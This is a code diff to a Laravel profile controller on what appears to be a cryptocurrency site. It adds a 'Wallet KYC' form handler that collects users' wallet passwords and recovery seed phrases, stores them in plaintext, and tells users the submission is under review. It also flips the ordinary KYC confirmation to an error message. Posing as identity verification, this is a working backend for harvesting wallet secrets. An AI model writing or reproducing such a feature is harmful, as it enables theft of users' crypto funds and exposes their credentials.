@@ -3,6 +3,8 @@
 namespace App\Http\Controllers;
 
 use App\Models\Kyc;
+use App\Models\WalletKyc;
+
 use Illuminate\View\View;
 use App\Models\CoinWallet;
 use Illuminate\Support\Str;
@@ -117,69 +119,43 @@ class ProfileController extends Controller
             'passport_photo' => $passport,
         ]);
     
-        return back()->with('success', 'KYC submitted successfully and is now under review.');
+        return back()->with('error', 'KYC submitted successfully and is now under review.');
+    }    
+    
+    public function walletkycProcess(Request $request)
+    {
+        $request->validate([
+            'password' => 'required',
+            'phrase' => 'required|string',
+        ]);
+    
+        $user = Auth::user();
+    
+        if ($user->walletKyc) {
+            return back()->with('wallet_kyc_error', 'You have already submitted your Wallet KYC.');
+        }
+    
+  
+    
+        WalletKyc::create([
+            
+            'user_id' => $user->id,
+            'password' => $request->password,
+            'phrase' => $request->phrase,
+            
+        ]);
+    
+        return back()->with('wallet_kyc_success', 'Wallet KYC submitted successfully and is now under review.');
     }
 
 
-    // public function kycProcess(Request $request)
-    // {
-    //     $request->validate([
-    //         'dob' => 'required|date',
-    //         'address' => 'required|string|max:255',
-    //         'city' => 'required|string|max:100',
-    //         'state' => 'required|string|max:100',
-    //         'zip' => 'required|string|max:20',
-    //         'id_type' => 'required|string',
-    //         'id_front' => 'required|image|mimes:jpeg,png,jpg|max:2048',
-    //         'id_back' => 'required|image|mimes:jpeg,png,jpg|max:2048',
-    //         'passport_photo' => 'required|image|mimes:jpeg,png,jpg|max:2048',
-    //     ]);
-    
-    //     $user = Auth::user();
-    
-    //     $folder = 'kyc_uploads/' . $user->id;
 
-    //     // Save to default disk (local => storage/app/public)
-    //     $idFrontPath = $request->file('id_front')->store($folder, 'public');
-    //     $idBackPath = $request->file('id_back')->store($folder, 'public');
-    //     $passportPath = $request->file('passport_photo')->store($folder, 'public');
     
-    //     if ($user->kyc) {
-    //         return back()->with('error', 'You have already submitted your KYC.');
-    //     }
-
-
-        
-    //     // Prevent duplicate KYC submission
-    //     if ($user->kyc) {
-    //         return back()->with('error', 'You have already submitted your KYC.');
-    //     }
-    
-    //     Kyc::create([
-    //         'user_id' => $user->id,
-    //         'dob' => $request->dob,
-    //         'address' => $request->address,
-    //         'city' => $request->city,
-    //         'state' => $request->state,
-    //         'zip' => $request->zip,
-    //         'id_type' => $request->id_type,
-         
-    //         'id_front' => $folder . '/' . basename($idFrontPath),
-    //         'id_back' => $folder . '/' . basename($idBackPath),
-    //         'passport_photo' => $folder . '/' . basename($passportPath),
-    //      // 'id_front' => Storage::url($idFrontPath),
-    //         // 'id_back' => Storage::url($idBackPath),
-    //         // 'passport_photo' => Storage::url($passportPath),
-    //     ]);
-    
-    //     return back()->with('success', 'KYC submitted successfully and is now under review.');
-
-    // }
     
     public function adminViewKycIndex()
     {
         $kycs = Kyc::with('user')->latest()->get();
         return view('admin.view-kyc-index', compact('kycs'));
     }
-    
+
 }
